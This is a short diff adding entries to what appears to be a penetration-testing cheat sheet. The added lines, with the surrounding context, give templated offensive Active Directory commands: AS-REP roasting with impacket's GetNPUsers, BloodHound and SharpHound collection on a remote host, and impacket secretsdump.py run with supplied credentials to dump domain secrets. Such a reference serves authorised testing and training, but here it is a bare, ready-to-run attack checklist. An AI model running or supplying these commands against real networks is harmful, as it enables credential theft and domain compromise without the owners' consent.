@@ -609,6 +609,21 @@ upload {FILE.exe}
 # ASREP ROAST
 python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip {IP ADDRESS} -request '{DC.NAME}/' -format hashcat
 
+# Bloodhound
+sudo ./usr/bin/neo4j console
+
+# RHOST
+./sharphound.exe -c all
+
+# LHOST
+./BloodHound  --no-sandbox
+
+# Dump secrets
+sudo python3 ./usr/share/doc/python3-impacket/examples/secretsdump.py '{DOMAIN}/{USERNAME}':'{PASSWORD}'@{IP ADDRESS}
+
+
+
+
 
 ```
 
